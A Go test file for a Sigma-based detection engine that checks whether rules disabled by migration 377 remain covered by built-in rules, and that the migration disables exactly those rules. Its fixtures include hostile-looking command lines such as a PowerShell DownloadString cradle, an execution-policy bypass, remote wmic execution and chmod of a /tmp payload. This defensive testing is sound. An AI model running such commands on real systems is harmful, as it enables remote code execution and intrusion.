package detection

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// Migration 377 disables seven `rules` rows because sigma_builtins.go now carries
// their selectors. That split is the dangerous kind: the deletion and the
// replacement live in different files, in different languages, and neither one
// fails if the other is wrong. Delete the builtin and the migration silently
// removes coverage; revert the migration and the double-counting silently comes
// back. Nothing in the build connects them.
//
// This test is that connection. For every rule 377 disables it asserts BOTH
// halves at once:
//
//   - the migration really disables it (parsed out of the SQL, not assumed), and
//   - an event that the DB row matched still matches a built-in.
//
// The events below are deliberately the ones the pre-existing built-ins MISSED —
// `wmic /node:` with no "process call create", `sudo docker exec`, crictl. Those
// are the cases that made "just disable the duplicate row" lossy here, unlike
// main's migration 374 where the built-in was a genuine superset. Writing the
// test against the easy cases would pass without proving anything.
//
// It is a coverage test, not a false-positive test: it says the technique is
// still detected somewhere in the api path. Whether the rule is too noisy is the
// FP soak's question, not this one's.

// portedDBRules pairs each rule migration 377 disables with events that the DB
// row matched, and the built-in title that must now catch each one.
var portedDBRules = []struct {
	dbRule string
	cases  []struct {
		why     string
		builtin string
		event   map[string]interface{}
	}
}{
	{
		dbRule: "WMI Remote Command Execution",
		cases: []struct {
			why     string
			builtin string
			event   map[string]interface{}
		}{
			{
				// The reason the DB row could not simply be dropped: the built-in
				// "Remote WMI Process Creation via wmic" ANDs in "process call
				// create", so a bare /node: invocation was invisible to it.
				why:     "wmic /node: without 'process call create'",
				builtin: "WMI Remote Command Execution",
				event: portedProc(`C:\Windows\System32\wbem\wmic.exe`,
					`wmic /node:10.0.0.5 /user:admin os get name`, ""),
			},
			{
				why:     "WmiPrvSE spawning a shell",
				builtin: "WMI Remote Command Execution",
				event: portedProc(`C:\Windows\System32\cmd.exe`, `cmd.exe /c whoami`,
					`C:\Windows\System32\wbem\WmiPrvSE.exe`),
			},
		},
	},
	{
		dbRule: "疑わしいPowerShell実行",
		cases: []struct {
			why     string
			builtin string
			event   map[string]interface{}
		}{
			{
				why:     "DownloadString cradle",
				builtin: "疑わしいPowerShell実行",
				event: portedProc(`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
					`powershell.exe -c "(New-Object Net.WebClient).DownloadString('http://x/a.ps1')"`, ""),
			},
			{
				why:     "execution-policy bypass",
				builtin: "疑わしいPowerShell実行",
				event: portedProc(`C:\Program Files\PowerShell\7\pwsh.exe`,
					`pwsh.exe -ExecutionPolicy Bypass -File a.ps1`, ""),
			},
		},
	},
	{
		dbRule: "Suspicious chmod of Executable in /tmp",
		cases: []struct {
			why     string
			builtin string
			event   map[string]interface{}
		}{
			{
				why:     "chmod +x on a /tmp payload",
				builtin: "Suspicious chmod of Executable in /tmp",
				event:   portedProc("/usr/bin/chmod", "chmod +x /tmp/payload", ""),
			},
			{
				why:     "chmod 777 under /dev/shm",
				builtin: "Suspicious chmod of Executable in /tmp",
				event:   portedProc("/bin/chmod", "chmod 777 /dev/shm/x", ""),
			},
		},
	},
	{
		dbRule: "Script Execution from World-Writable Directory (Linux)",
		cases: []struct {
			why     string
			builtin string
			event   map[string]interface{}
		}{
			{
				why:     "bash /tmp/ script",
				builtin: "Script Execution from World-Writable Directory (Linux)",
				event:   portedProc("/bin/bash", "bash /tmp/install.sh", ""),
			},
			{
				why:     "sh /var/tmp/ script",
				builtin: "Script Execution from World-Writable Directory (Linux)",
				event:   portedProc("/bin/sh", "sh /var/tmp/stage2.sh", ""),
			},
		},
	},
	{
		dbRule: "Container Image Build on Host (DB)",
		cases: []struct {
			why     string
			builtin string
			event   map[string]interface{}
		}{
			{
				// Absorbed into the built-in as `cmdline_only`. Image is /sudo, so
				// the built-in's Image|endswith branch does not apply.
				why:     "sudo-wrapped docker build (Image is the wrapper)",
				builtin: "Container Image Build on Host",
				event:   portedProc("/usr/bin/sudo", "sudo docker build -t evil .", ""),
			},
			{
				why:     "direct docker build",
				builtin: "Container Image Build on Host",
				event:   portedProc("/usr/bin/docker", "docker build -t evil .", ""),
			},
		},
	},
	{
		dbRule: "Container Administration Command (DB)",
		cases: []struct {
			why     string
			builtin string
			event   map[string]interface{}
		}{
			{
				// crictl is absent from the built-in's Image|endswith list entirely.
				why:     "crictl exec",
				builtin: "Container Administration Command Execution",
				event:   portedProc("/usr/bin/crictl", "crictl exec -it abc123 sh", ""),
			},
			{
				why:     "sudo-wrapped docker exec (Image is the wrapper)",
				builtin: "Container Administration Command Execution",
				event:   portedProc("/usr/bin/sudo", "sudo docker exec -it web sh", ""),
			},
		},
	},
	{
		dbRule: "Linux Shell Init File Modification (FIM)",
		cases: []struct {
			why     string
			builtin string
			event   map[string]interface{}
		}{
			{
				why:     ".bashrc written (file_event, no command line)",
				builtin: "Linux Shell Init File Modification (FIM)",
				event: map[string]interface{}{
					"type":      "file",
					"path":      "/home/alice/.bashrc",
					"operation": "FILE_ACTION_MODIFY",
				},
			},
			{
				why:     "/etc/profile.d drop-in",
				builtin: "Linux Shell Init File Modification (FIM)",
				event: map[string]interface{}{
					"type":      "file",
					"path":      "/etc/profile.d/00-evil.sh",
					"operation": "FILE_ACTION_MODIFY",
				},
			},
		},
	},
}

func portedProc(image, cmdline, parent string) map[string]interface{} {
	e := map[string]interface{}{
		"type":         "process",
		"image_path":   image,
		"command_line": cmdline,
	}
	if parent != "" {
		e["parent_image_path"] = parent
	}
	return e
}

func TestDisabledDBRulesAreCoveredByBuiltins(t *testing.T) {
	ev := NewSigmaEvaluator()
	if n := LoadBuiltinRules(ev); n == 0 {
		t.Fatal("no builtin rules loaded — every assertion below would be vacuous")
	}

	for _, r := range portedDBRules {
		for _, c := range r.cases {
			t.Run(r.dbRule+"/"+c.why, func(t *testing.T) {
				event := map[string]interface{}{}
				for k, v := range c.event {
					event[k] = v
				}
				addPipelineSigmaAliases(event)

				var titles []string
				for _, m := range ev.EvaluateEvent(event) {
					if m.RuleTitle == c.builtin {
						return
					}
					titles = append(titles, m.RuleTitle)
				}
				t.Errorf("migration 377 disables the `rules` row %q, and this event matched it, "+
					"but builtin %q did not fire.\n"+
					"  event:   %v\n"+
					"  matched: %v\n"+
					"  Disabling the DB row is only lossless while the builtin covers it. "+
					"Either restore the builtin selector or revert the row's disable in 377 — "+
					"do not delete this case, it is the evidence that the swap was safe.",
					r.dbRule, c.builtin, event, titles)
			})
		}
	}
}

// The other half: 377 must actually disable exactly the rules this file claims,
// read out of the SQL. Without this, renaming a rule in the migration (or
// dropping a statement in a merge) leaves the test above asserting coverage for
// a row that is still live — passing while proving nothing.
func TestMigration377DisablesExactlyThePortedRules(t *testing.T) {
	path := filepath.Join("..", "..", "migrations", "377_disable_db_rules_ported_to_builtins.sql")
	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("read 377: %v", err)
	}
	sql := string(b)

	for _, r := range portedDBRules {
		want := "WHERE name = '" + r.dbRule + "'"
		if !strings.Contains(sql, want) {
			t.Errorf("377 does not disable %q (looked for %s) — this file asserts a builtin "+
				"covers it, which is only worth asserting if the DB row is actually gone",
				r.dbRule, want)
		}
	}

	// And nothing beyond them: an extra disable would remove coverage that no
	// case here vouches for.
	for _, line := range strings.Split(sql, "\n") {
		line = strings.TrimSpace(line)
		rest, ok := strings.CutPrefix(line, "WHERE name = '")
		if !ok {
			continue
		}
		name := strings.TrimSuffix(strings.TrimSuffix(rest, ";"), "'")
		found := false
		for _, r := range portedDBRules {
			if r.dbRule == name {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("377 disables %q but no case in portedDBRules shows a builtin still covers it — "+
				"add the evidence or drop the statement", name)
		}
	}
}
